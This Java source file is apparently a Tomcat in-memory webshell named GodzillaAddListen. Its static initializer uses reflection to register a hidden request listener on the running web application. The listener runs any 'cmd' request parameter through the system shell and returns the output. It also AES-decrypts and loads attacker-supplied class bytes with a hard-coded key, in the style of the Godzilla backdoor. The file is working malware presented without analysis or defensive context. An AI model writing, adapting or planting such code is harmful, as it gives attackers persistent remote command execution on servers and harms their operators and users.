import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.RequestFacade;
import org.apache.catalina.connector.Response;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.lang.reflect.Field;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.http.HttpSession;
import javax.servlet.ServletRequestEvent;
import javax.servlet.ServletRequestListener;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Scanner;


public class GodzillaAddListen extends ClassLoader implements ServletRequestListener {

    static {
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            ClassLoader z = null;
            GodzillaAddListen servletRequestListener = new GodzillaAddListen(z);
            Method listener = Class.forName("org.apache.catalina.core.StandardContext").getDeclaredMethod("addApplicationEventListener", Object.class);
            listener.invoke(standardContext,servletRequestListener);

        } catch (Exception hi) {
            //hi.printStackTrace();
        }
    }

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {

    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {
        System.out.println("GodzillaAddListen Start ......");
        try {
            System.out.println("Do Listener ......");
            // 获取request和response对象
            RequestFacade requestfacade= (RequestFacade) servletRequestEvent.getServletRequest();
            Field field = requestfacade.getClass().getDeclaredField("request");
            field.setAccessible(true);
            Request request = (Request) field.get(requestfacade);
            Response response = request.getResponse();
            HttpSession session = request.getSession();

            // Cmd MemShell
            String cmd = request.getParameter("cmd");
            if(cmd != null && !cmd.isEmpty()){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }

            String Pwd = "pass";
            String xc = "3c6e0b8a9c15224a";
            String md5 = md5(Pwd + xc);
            byte[] data = base64Decode(request.getParameter(Pwd));
            data = x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", (new GodzillaAddListen(getClass().getClassLoader())).Q(data));
            } else {
                request.setAttribute("parameters", data);
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = ((Class)session.getAttribute("payload")).newInstance();
                f.equals(arrOut);
                f.equals(data);
                response.getWriter().write(md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                response.getWriter().write(md5.substring(16));
            }


        }catch (Exception e){
            e.printStackTrace();
        }
    }

    public GodzillaAddListen(ClassLoader z) {
        super(z);
    }

    public Class Q(byte[] cb) {
        return defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        String xc = "3c6e0b8a9c15224a";
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception exception) {}
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }
}